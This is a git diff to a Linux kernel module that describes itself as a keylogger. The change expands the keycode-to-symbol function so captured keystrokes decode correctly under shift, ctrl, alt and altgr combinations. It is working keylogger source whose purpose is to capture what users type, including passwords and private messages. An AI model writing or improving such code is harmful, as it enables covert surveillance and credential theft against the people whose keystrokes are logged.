@@ -9,7 +9,45 @@ MODULE_DESCRIPTION("A keylogger");
 MODULE_LICENSE("GPL");
 
 static u_short kloggg_keycode_to_symbol(unsigned int keycode, int shift_mask) {
-  return plain_map[keycode];
+  u_short symbol;
+
+  if (shift_mask & (1 << KG_SHIFT) && shift_mask & (1 << KG_CTRL)) {
+    symbol = shift_ctrl_map[keycode];
+  }
+
+  else if (shift_mask & (1 << KG_ALT) && shift_mask & (1 << KG_CTRL)) {
+    symbol = ctrl_alt_map[keycode];
+  }
+
+  else if (shift_mask & (1 << KG_ALTGR) && shift_mask & (1 << KG_CTRL)) {
+    symbol = altgr_ctrl_map[keycode];
+  }
+
+  else if (shift_mask & (1 << KG_SHIFT) && shift_mask & (1 << KG_ALT)) {
+    symbol = shift_alt_map[keycode];
+  }
+
+  else if (shift_mask & (1 << KG_SHIFT)) {
+    symbol = shift_map[keycode];
+  }
+
+  else if (shift_mask & (1 << KG_ALTGR)) {
+    symbol = altgr_map[keycode];
+  }
+
+  else if (shift_mask & (1 << KG_ALT)) {
+    symbol = alt_map[keycode];
+  }
+
+  else if (shift_mask & (1 << KG_CTRL)) {
+    symbol = ctrl_map[keycode];
+  }
+  
+  else {
+    symbol = plain_map[keycode];
+  }
+  
+  return symbol;
 }
 
 static int kloggg_log(struct notifier_block *nb, unsigned long action, void *data) {
